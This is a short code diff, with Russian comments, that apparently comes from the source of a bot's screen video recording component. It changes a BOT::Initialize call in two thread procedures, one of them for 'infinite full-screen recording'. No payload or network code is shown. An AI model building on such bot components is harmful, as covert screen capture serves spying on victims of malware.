@@ -528,7 +528,7 @@ namespace VideoRecorderSrv
 	DWORD WINAPI ClientMainProc(LPVOID Data)
 	{
 		// Основная процедура клиента записи видео
-		BOT::Initialize();
+		BOT::Initialize(ProcessUnknown);
 
 		VDRDBG("VideoRecorder", "Запущен клиент записи видео. PID %d", ClientPID);
 
@@ -633,7 +633,7 @@ namespace VideoRecorderSrv
 	DWORD WINAPI InfiniteRecordingProc(LPVOID)
 	{
 		// Функция бесконечной записи видео
-		BOT::Initialize();
+		BOT::Initialize(ProcessUnknown);
 
         VDRDBG("VideoRecorder", "Запускаем полноэкранную бесконечную запись видео");
 
